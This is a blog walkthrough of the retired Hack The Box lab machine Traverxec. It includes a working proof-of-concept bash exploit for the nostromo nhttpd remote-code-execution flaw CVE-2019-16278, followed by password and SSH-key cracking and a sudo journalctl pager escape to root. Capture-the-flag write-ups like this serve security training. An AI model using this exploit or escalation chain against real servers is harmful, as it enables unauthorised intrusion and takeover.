---
layout: post
title: "Traverxec: Hack The Box Walkthrough"
date: 2020-04-13 14:31:16 +0000
last_modified_at: 2020-04-13 14:31:16 +0000
category: Walkthrough
tags: ["Hack The Box", Traverxec, retired, Linux, Easy]
comments: true
image:
  feature: traverxec-htb-walkthrough.jpg
  credit: andreas160578 / Pixabay
  creditlink: https://pixabay.com/photos/atom-chemistry-molecular-physics-1331961/
---

This post documents the complete walkthrough of Traverxec, a retired vulnerable [VM][1] created by [jkr][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Traverxec is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let's start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.165 --rate=700

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-11-18 02:50:35 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.165
Discovered open port 80/tcp on 10.10.10.165
```

Looks pretty normal to me. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.165
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```

Hmm. I wonder what's nostromo? Anyway, this is what the site looks like.

{% include image.html image_alt="5c9cb423.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/5c9cb423.png" %}

Nice and clean template :+1:

### CVE-2019-16278 - nhttpd <= 1.9.6 Remote Code Execution

According to [CVE-2019-16278](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16278), there's a directory traversal vulnerability in nostromo nhttpd through 1.9.6 leading to remote code execution. The discoverer ([sp0re](https://git.sp0re.sh/sp0re)) was kind to leave a proof-of-concept bash [script](https://git.sp0re.sh/sp0re/Nhttpd-exploits/src/branch/master/CVE-2019-16278.sh) to test the vulnerability.

<div class="filename"><span>test.sh</span></div>

```bash
#!/bin/bash

HOST=$1
PORT=$2
shift 2

( \
  echo -n -e 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n'; \
  echo -n -e 'Content-Length: 1\r\n\r\necho\necho\n'; \
  echo "$@ 2>&1" \
) | nc "$HOST" "$PORT" \
  | sed --quiet -e ':S;/^\r$/{n;bP};n;bS;:P;n;p;bP'
```

Let's give it a shot!

{% include image.html image_alt="625e764a.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/625e764a.png" %}

Perfect.

### Low-Privilege Shell

Lucky for us, there's a copy of `nc` in `/usr/bin/nc` that supports command execution.

{% include image.html image_alt="0787984e.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/0787984e.png" %}

With that, we can get our shell with ease.

{% include image.html image_alt="e2f58ae3.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/e2f58ae3.png" %}

### John the Ripper

It wasn't long before I found the configuration directory for nostromo at `/var/nostromo/conf`. I found the `.htpasswd` in that directory.

{% include image.html image_alt="b25b1d9f.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/b25b1d9f.png" %}

Sending the hash to JtR gave the following.

{% include image.html image_alt="8768b736.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/8768b736.png" %}

Well, the excitement sure is short-lived because it's not the password for `david`'s account. We'll just have to keep this in mind the next time we encounter something that requires a password.

### Protected File Area

In the same directory, we can peek into nostromo's nhttpd configuration.

```
$ cat /var/nostromo/conf/nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

Notice that there's supposed to be a `public_www` directory in `/home/david`? (This sure is old school) Combined that with the permission of `david`'s home directory I suspect something is up.

{% include image.html image_alt="69e09227.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/69e09227.png" %}

Check this out.

{% include image.html image_alt="421a228e.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/421a228e.png" %}

In summary, as long as you know the absolute path to a file and you have read permissions, you can download a file to your attacking machine for further analysis.

{% include image.html image_alt="18eeace6.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/18eeace6.png" %}

Well well well, what have we here? Looks like we have `david`'s SSH keys!

### John the Ripper Redux

It should come as no surprise that `david`'s private key is password-protected.

{% include image.html image_alt="4795dd73.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/4795dd73.png" %}

Well, this is something that John the Ripper is good at.

{% include image.html image_alt="9cf04fc7.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/9cf04fc7.png" %}

The password is `hunter`.

### Getting `user.txt`

Armed with `david`'s private key, we can SSH in and retrieve `user.txt`.

{% include image.html image_alt="dcf3a097.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/dcf3a097.png" %}

## Privilege Escalation

During enumeration of `david`'s account, I notice something odd. First of all, the PATH is set to the following.

{% include image.html image_alt="0631fdac.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/0631fdac.png" %}

And in `/home/david/bin`, there's a `bash` script.

<div class="filename"><span>server-stats.sh</span></div>

```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

Upon seeing the script, I knew a classic shell-escape was imminent. Notice that `david` is able to `sudo journalctl` as `root` without password?

{% include image.html image_alt="b4fe47a1.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/b4fe47a1.png" %}

### Classic Shell Escape

What's this class shell-escape I'm talking about? Well, since we can `sudo journalctl` displaying the most recent five lines, we can open up a terminal with less than five lines, forcing `PAGER` to take effect. In most distributions, `PAGER` is usually set to `less`, which we can then escape to shell.

Here's `xterm` running with four lines.

{% include image.html image_alt="cd72a987.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/cd72a987.png" %}

See what happens when `sudo journalctl` is run.

{% include image.html image_alt="8605ffcc.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/8605ffcc.png" %}

Only the first three lines are displayed and `less` is executed as `root`. Escape to shell with `!sh`.

{% include image.html image_alt="7b06a162.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/7b06a162.png" %}

Boom!

### Getting `root.txt`

Getting `root.txt` with a `root` shell is trivial.

{% include image.html image_alt="1754956e.png" image_src="/db790aaf-ea50-46b0-8a84-5f421092d92d/1754956e.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/217
[2]: https://www.hackthebox.eu/home/users/profile/77141
[3]: https://www.hackthebox.eu/
